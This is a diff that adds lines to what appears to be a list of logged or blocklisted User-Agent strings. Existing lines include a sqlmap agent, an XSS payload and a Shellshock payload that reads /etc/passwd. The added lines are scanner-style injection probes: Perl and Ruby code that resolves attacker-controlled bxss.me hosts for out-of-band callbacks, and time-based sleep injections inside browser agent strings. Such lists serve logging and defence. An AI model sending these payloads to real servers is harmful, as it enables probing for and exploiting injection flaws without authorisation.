@@ -180,3 +180,13 @@ Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; FunWebPr
 sqlmap/1.9.6#stable (https://sqlmap.org)
 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0 Gecko/20100101 Firefox/40.1';alert/XSS/);//
 ""( { :; }; echo ; /bin/bash -c 'cat /etc/passwd'"")
+"".gethostbyname(lc(""hithv"".""tcijcrum46810.bxss.me."").""A"".chr(67).chr(hex(""58"")).chr(108).chr(72).chr(98).chr(78)."")
+'+'A'.concat(70-3.concat(22*4).concat(103).concat(84).concat(101).concat(79)+(require'socket' Socket.gethostbyname('hitxe'+'yaaqixyge5e7a.bxss.me.')[3].to_s)+')
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36""&&sleep(27*1000)*ezlnjl&&"")
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'&&sleep(27*1000)*wfrmfw&&')
+geth(ostbyname(lc('hityd'.'fkgyrihcd86cb.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(121).chr(67).chr(112).chr(84))
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36""||sleep(27*1000)*wzjkfu||"")
+'A'.concat(70-3.concat(22*4).concat(117).concat(78).concat(118).concat(77)+(require'socket' Socket.gethostbyname('hitts'+'ynoszoxhd0353.bxss.me.')[3].to_s))
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'||sleep(27*1000)*hgzuff||')
+'.gethostbyname(lc('hithq'.'cpsmkpvvf07d6.bxss.me.').'A'.chr(67).chr(hex('58')).chr(115).chr(80).chr(107).chr(78).')
+""+""A"".concat(70-3.concat(22*4).concat(113).concat(67).concat(102).concat(76)+(require""socket"" Socket.gethostbyname(""hitxm""+""rkltdumh3c54d.bxss.me."")[3].to_s)+"")
